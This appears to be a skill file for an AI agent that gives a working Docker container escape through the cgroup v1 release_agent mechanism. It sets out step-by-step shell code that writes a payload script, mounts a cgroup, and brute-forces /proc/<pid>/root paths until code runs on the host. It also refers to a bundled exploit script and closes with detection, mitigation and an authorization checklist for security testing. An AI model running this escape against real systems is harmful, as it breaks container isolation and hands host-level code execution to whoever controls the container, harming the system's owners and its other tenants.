---
name: docker-cgroup-escape
description: Docker container escape via cgroup release_agent exploit. Use this skill whenever the user mentions container escape, privilege escalation from containers, cgroup exploitation, Docker security testing, or needs to test container breakout vulnerabilities. This skill provides the technique for exploiting the cgroup release_agent mechanism to execute host code from within a container by brute-forcing PIDs through /proc/<pid>/root symlinks.
---

# Docker Cgroup Release Agent Escape

A container escape technique that exploits the cgroup `release_agent` mechanism to execute arbitrary code on the host from within a container. This works by brute-forcing process IDs (PIDs) to find a process running inside the target container, then using the `/proc/<pid>/root` symlink to reference host paths.

## ⚠️ Authorization Warning

**This skill is for authorized security testing only.** Only use these techniques on systems you own or have explicit written permission to test. Unauthorized container escape attempts may violate laws and policies.

## How It Works

The exploit leverages three key Linux mechanisms:

1. **`/proc/<pid>/root` symlinks**: Every process has a `/proc/<pid>/root` symlink pointing to its root filesystem. For container processes, this points to the container's filesystem on the host.

2. **Cgroup `release_agent`**: When a cgroup is released (all processes leave it), the kernel executes the script specified in `release_agent`.

3. **PID brute-forcing**: By iterating through PIDs and writing `/proc/<pid>/root/<path>` to `release_agent`, we can eventually hit a container process and trigger execution.

## Prerequisites

- **Privileged container** or container with `CAP_SYS_ADMIN`
- **cgroup v1** (not v2) - the `release_agent` interface was removed in cgroup v2
- **Mount permissions** - ability to mount cgroup filesystems
- **Kernel < 5.10.93/5.15.17/5.16.2** OR privileged container on patched kernel (unprivileged containers blocked on patched kernels per CVE-2022-0492)

## Modern System Limitations (2025)

| System | Status |
|--------|--------|
| cgroup v2 (Fedora 40, Ubuntu 24.10, systemd-256+) | ❌ `release_agent` removed entirely |
| Hybrid cgroup (v1 memory, v2 others) | ⚠️ Must use v1 controller (e.g., `rdma`) |
| AppArmor/SELinux enforcing | ⚠️ May block mount or `release_agent` writes |
| Unprivileged container on patched kernel | ❌ Blocked by CVE-2022-0492 |

## Usage

### Quick Test

Run the bundled exploit script to test if the technique works in your environment:

```bash
./scripts/cgroup-release-agent-exploit.sh
```

This will:
1. Create a payload script that outputs `ps -eaf` to a file
2. Set up a cgroup with `notify_on_release=1`
3. Brute-force PIDs until the payload executes
4. Display the output if successful

### Manual Execution

If you need to customize the exploit, follow these steps:

#### Step 1: Create Payload

```bash
OUTPUT_DIR="/tmp"
CGROUP_NAME="escape_test"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
OUTPUT_NAME="${CGROUP_NAME}_output.txt"

cat > ${OUTPUT_DIR}/${PAYLOAD_NAME} << 'EOF'
#!/bin/sh
OUTPATH=$(dirname $0)/${OUTPUT_NAME}
ps -eaf > ${OUTPATH} 2>&1
EOF
chmod +x ${OUTPUT_DIR}/${PAYLOAD_NAME}
```

#### Step 2: Set Up Cgroup

```bash
CGROUP_MOUNT="/tmp/cgrp"
mkdir -p ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir -p ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
```

#### Step 3: Brute-Force PIDs

```bash
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
MAX_PID=65535

TPID=1
while [ ! -f ${OUTPUT_PATH} ] && [ ${TPID} -le ${MAX_PID} ]; do
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  echo $$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs
  TPID=$((TPID + 1))
done

if [ -f ${OUTPUT_PATH} ]; then
  echo "✓ Escape successful!"
  cat ${OUTPUT_PATH}
else
  echo "✗ No valid PID found"
fi
```

## Detection & Mitigation

### Detection Signs

- Unexpected cgroup mounts in `/tmp` or other writable locations
- Rapid writes to `/sys/fs/cgroup/*/release_agent`
- Processes spawning from cgroup release events
- New files appearing in container root that shouldn't exist

### Mitigation Strategies

1. **Use cgroup v2**: The `release_agent` interface doesn't exist in v2
2. **Disable privileged containers**: Use `--privileged=false` or equivalent
3. **Apply AppArmor/SELinux profiles**: Block cgroup mounts and `release_agent` writes
4. **Kernel hardening**: Ensure `CAP_SYS_ADMIN` restrictions are enforced
5. **Monitor cgroup activity**: Alert on `release_agent` modifications

## Related Techniques

- **CVE-2022-0492**: Kernel hardening that requires `CAP_SYS_ADMIN` in initial user-namespace
- **Container filesystem path discovery**: Alternative method when `/proc/<pid>/root` is blocked
- **cgroup v1 controller enumeration**: Finding available v1 controllers on hybrid systems

## References

- [Original blog post](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [CVE-2022-0492](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)
- [Linux cgroup documentation](https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1.html)

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `mount: permission denied` | Container lacks mount capabilities |
| `release_agent: Read-only file system` | AppArmor/SELinux blocking writes |
| No output after 65535 PIDs | cgroup v2 system or no container processes |
| `notify_on_release` write fails | cgroup v2 or controller doesn't support it |
| Wrong controller type | Try `rdma`, `cpu`, or `blkio` instead of `memory` |

## Safety Checklist

Before running this exploit:

- [ ] I have explicit authorization to test this system
- [ ] I understand this may crash containers or services
- [ ] I have documented the test for compliance
- [ ] I have a rollback plan if something breaks
- [ ] I'm not running this in production without approval
